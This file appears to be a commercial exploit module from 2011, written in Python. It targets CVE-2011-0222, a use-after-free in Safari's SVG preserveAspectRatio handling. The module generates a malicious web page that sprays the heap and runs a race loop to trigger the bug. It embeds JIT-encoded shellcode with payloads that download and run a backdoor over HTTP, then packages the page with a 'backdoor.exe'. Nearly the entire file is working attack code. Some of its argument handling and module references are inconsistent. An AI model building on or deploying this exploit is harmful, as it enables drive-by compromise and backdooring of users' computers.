#! /usr/bin/env python

#Copyright HT srl, 2011
#http://www.hackingteam.it/ for more information

#cod

#
# Apple Safari iFrame vulnerability
# vupen

import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile
import base64
import bz2
from random import *

import x86shelldrophttp
import x86firststage
import x86heap
import x86int3
import ASCIIHexWhitespace
import x86helloworld
import jscript_unicode
import jitencoder

NAME="safari_svg_preserveAspectRatio"
DESCRIPTION="Apple Safari SVG 'preserveAspectRatio' Use-after-free Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Apple"
DOCUMENTATION["Repeatability"]="One Shot"
DOCUMENTATION["Date public"] = "2011/??-??"
DOCUMENTATION["CVE Name"] = "CVE-2011-0222"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-0222"
DOCUMENTATION["Note"] = """Multiple memory corruption issues existed in WebKit. 
Visiting a maliciously crafted website may lead to an unexpected application termination or arbitrary code execution."""

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Clientside"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP", "VISTA", "SEVEN"]
PROPERTY['DELIVERY'] = 'HTTP'

NOTES="""
"""

CHANGELOG="""

"""

DEBUGNOTES="""
"""

class exploit:
	
	infile =""
	outfile =""

	def __init__(self, backdoorPath, zipFile):
		#self.setInfo(DESCRIPTION)
		self.setVersions()
		self.r = Random()
		self.r.seed()
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile
		self.backdoorPath = backdoorPath
		self.trigger_file = self.randfilename() + ".swf"

	"""
	return a random char from a range
	"""
	def getrandchar(self):
		chars = "q0w1e2r3t4y5u6i7o8p9a_sdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM"
		i = self.r.randint(0, len(chars)-1)
		return chars[i]

	"""
	return a file name (random dot html (omissis))
	"""
	def randfilename(self):
		newfilename = ""
		
		for i in range(8):
			newfilename += struct.pack('c', self.getrandchar())
				
		return newfilename
	
	def displayVersions(self):
		for v in self.versions.keys():
			print "Version %d: %s"%(v,self.versions[v][0])

	def setVersions(self):
		self.versions={}
		#name, jmp esp, writeloc, writable, shelloc
		#                                    POP/POP/RET
		self.versions[1]=("Apple Safari 5.0", 0x04040404)
   
	def createShellcode(self):
		result = None
		
		if payload == 0:
			obj = x86shelldrop.x86shelldrop()
			x = obj.get(self.backdoorPath)
			#result = struct.pack('l', len(x)+4) + x
			result = x
		elif payload == 1:
			obj = x86shelldrophttp.x86shelldrophttp()
			x = obj.get(self.backdoorPath)
			result = x
		elif payload == 2:
			obj = x86helloworld.x86helloworld()
			x = obj.get()
			result = x
			
		if self.debugmode == True:
			obj = x86int3.x86int3()
			result = obj.get() + result
			
		return result

	
	def run(self):
		self.makefile()
				
		return 1

	def get_target_svg(self):
		value = """
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg width="100%" height="100%" version="1.1" xmlns="http://www.w3.org/2000/svg">

</svg>"""
		return value
		
	def get_root_index_content(self):
		value = """
<html>
    <head>
        <script type="text/javascript">
            var F =
            "{ var y=(#{shellcode}); return y; }";

            var S="";
            for (var i=1;i<800;i++)
                S += "function fct_" + i + "()" + F + " fct_" + i + "();";
            eval(S);
        </script>
        
        <script type="text/javascript">
            
            function dword(a)
            {
                return String.fromCharCode(a & 0xFFFF) + String.fromCharCode(a >> 16);
            }
            
            function BuildBlock(b, s)
            {
                s -= 4;
                while(b.length * 2 < s) { b += b; }
                return b.substring(0,  s / 2);
            }
                        
            function UaF_Spray()
            {
                this.blocks = new Array();
                var slide = BuildBlock(dword(0x085A00D0), 0x20);
                
                for (var i=0;i<0x5000;i++)
                {
                    this.blocks[i] = [unescape(slide)].join("");
                }
            }

            function crash(a)
            {
                a = target.document.rootElement.preserveAspectRatio;
                eval('UaF_Spray(); a.baseVal.meetOrSlice;');
            }

            function RaceLoop()
            {
                while(1)
                {
                    crash(target);
                }
            }
			
        </script>
    </head>

    <body>
      <div id="a">
        <iframe src="target.svg" id="target" onload="RaceLoop();"></iframe>
      </div>
    </body>
</html>
"""

		adapter = jitencoder.jitencoder()
		
		shellcode = self.createShellcode()
		shellcode = adapter.get2(shellcode, 7, "0x085A00EC^")
		
		html = value.replace("#{shellcode}", shellcode)
		return html


	def makefile(self):
	
		html_index = self.get_root_index_content()
		html_svg = self.get_target_svg()
		
		#html_index6 = self.get_index6()
		#html_index8 = self.get_index8()
		
		with warnings.catch_warnings():
			warnings.simplefilter('ignore')
			tmp_index = os.tempnam()
			tmp_targetsvg = os.tempnam()
			#tmp_index6 = os.tempnam()
			#tmp_backdoor = os.tempnam()
			
		f = open(tmp_index,mode='wb')
		f.write(html_index)
		f.close()
		
		f = open(tmp_targetsvg, mode='wb')
		f.write(html_svg)
		f.close()
		
		#f = open(tmp_index6,mode='wb')
		#f.write(html_index6)
		#f.close()
		
		#f = open(tmp_index8,mode='wb')
		#f.write(html_index8)
		#f.close()
		
		# Create the output archive
		print "Creating %s zip file archive"%(self.outputCompressed)
		zip = zipfile.ZipFile(self.outputCompressed, "w", zipfile.ZIP_DEFLATED)
		
		print "Adding index file"
		zip.write(tmp_index, "index.html")
		
		print "Adding target.svg"
		zip.write(tmp_targetsvg, "target.svg")
		
		if extraPath != None:
			print "Adding copy of backdoor"
			zip.write(extraPath, "backdoor.exe")

		zip.close()
		
		try:
			os.unlink(tmp_index)
			os.unlink(tmp_targetsvg)
			#os.unlink(tmp_index6)
		except WindowsError:
			print "I/O error when deleting temp. files"
			
		return 1


if __name__=='__main__':
	dbg = False
	http = False
	
	if len(sys.argv) < 3:
		print "[ERROR] %s require 3 parameters"%(DESCRIPTION)
		print "[-INFO] {payload:[http|local|debug]} [localbackdoor|urltodownload] output"
		sys.exit(0)

	# Parse payload section
	if sys.argv[1].split(':')[0] != "payload":
		print "[ERROR] First parameters must be payload"
		sys.exit(0)
	else:
		requiredpayload = sys.argv[1].split(':')[1]	
		if requiredpayload == "http":
			print "[HTTP] Using HTTP reverse connect to download exe"
			payload = 1
			http = True
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
				
		elif requiredpayload == "debug":
			print "[DEBUG] Using INT3 exploit mode"
			payload = 0
			dbg = True
		elif requiredpayload == "local":
			print "[LOCAL] Run from %currdir%"
			payload = 2
			if len(sys.argv) > 3:
				extraPath = sys.argv[4]
			else:
				extraPath = None
		else:
			print "[ERROR] Unknown payload defined"
			sys.exit(0)
	
	# Interprete section
	
	if http == False:
		if os.path.isfile(sys.argv[3]) == False:
			print "[ERROR] File %s doesn't exists."%(sys.argv[3])
			sys.exit(0)

		if os.path.getsize(sys.argv[3]) == 0:
			print "[ERROR] File %s has length zero."%(sys.argv[3])
			sys.exit(0)

	#if os.path.isfile("resources/blank.pdf") == False:
	#	print "[ERROR] resources/blank.pdf not found"
	#	sys.exit(0)
	
	print 'Running %s Exploit v %s'%(DESCRIPTION,VERSION)

	app=exploit(sys.argv[2], sys.argv[3])
	app.run()
	
	print ' ... done'
	